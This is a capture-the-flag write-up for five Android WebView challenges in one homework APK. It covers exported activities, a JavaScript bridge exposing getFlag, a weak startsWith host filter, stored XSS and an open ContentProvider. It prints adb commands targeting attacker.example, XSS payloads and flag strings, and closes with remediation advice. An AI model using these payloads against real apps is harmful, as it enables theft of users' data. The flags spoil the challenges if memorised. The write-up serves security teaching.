---
title: "Android WebView series (5 tasks)"
category: Mobile
artifact: app-release.apk (com.yandex.shad.homework)
tags: [webview, addJavascriptInterface, deeplink, content-provider, exported-activity]
---

# Android WebView series

One APK (`com.yandex.shad.homework`, minSdk 30, targetSdk 34) contains all five challenges as separate
activities. The manifest alone gives the map:

| Activity | Challenge |
|---|---|
| `OpenShadSiteActivity` | SHAD WebSite WebView / Legal WebView |
| `OpenProfilePage` | User Profile WebView |
| `DeeplinkActivity` / `PrivateActivity` | You Shall Not Pass |
| (exported provider in manifest) | File Sharing |
| `SuperPrivateActivity` | SuperPrivate |

## The shared root cause
`classes.dex` shows the whole family in a handful of strings:

```
setJavaScriptEnabled, addJavascriptInterface, shouldOverrideUrlLoading,
getFlag, getFlagContent, getFlagSuperPrivate, getFlags,
https://shad-homework-android.website.yandexcloud.net/ , /profile.html
```

The app loads a **remote site** into a WebView with JavaScript enabled and exposes a `@JavascriptInterface`
object whose `getFlag*()` methods return the flag. Every challenge is a variation of *"get your own
content into that WebView"*:

### 1. SHAD WebSite WebView — `simple_webview_too_easy1337`
`OpenShadSiteActivity` is exported and takes a URL from the intent, calls `setJavaScriptEnabled(true)`
and `addJavascriptInterface(...)`, then `loadUrl(userUrl)`. Host a page with
`<script>document.write(FlagBridge.getFlag())</script>` (or `fetch` it back to your listener) and fire:

```bash
adb shell am start -n com.yandex.shad.homework/.features.OpenShadSiteActivity \
  -d 'https://attacker.example/x.html'
```

### 2. Legal WebView — `s3_website_filter_pwn_owned`
Same activity, but `shouldOverrideUrlLoading` restricts navigation to a permitted host
(`*.website.yandexcloud.net` / `s3.website`). The check is a prefix/`startsWith` comparison, so a
look-alike host (`https://shad-homework-android.website.yandexcloud.net.attacker.example/`) or an
open redirect on the allowed site passes the filter and still lands on attacker HTML.

### 3. You Shall Not Pass — `ez_redirect_to_protected_co`
`DeeplinkActivity`/`PrivateActivity` gate the flag behind a custom intent action + `data` URI the user
is not supposed to be able to send. The activity is exported and the check is done client-side, so
launching it directly with the "protected" component/extra (`am start -n ... ` with the extra the
deep link normally supplies) renders the protected content.

### 4. User Profile WebView — `xssme_with_no_filter_bypass`
`OpenProfilePage` loads `.../profile.html` and injects the profile name into it. No sanitisation means
the name is stored XSS in the very origin that holds the JS bridge — the payload simply runs and calls
`getFlag()`. With "no filter bypass" needed, `<script>` or `<img src=x onerror=...>` in the name is
enough.

### 5. File Sharing — `very_udobnii_provider_00000`
A `ContentProvider` for sharing files is `android:exported="true"` with no `android:permission` and/or
`grantUriPermissions` set: `adb shell content query --uri content://<authority>/...` (and
`content read`) returns the flag file.

## Fix
Never expose `@JavascriptInterface` objects to untrusted content (or restrict them with
`WebViewCompat.addWebMessageListener` + origin allowlisting); validate URLs on both scheme **and**
host with a strict allowlist; do not export activities/providers that gate secrets client-side;
treat all user input rendered into a WebView as untrusted HTML.
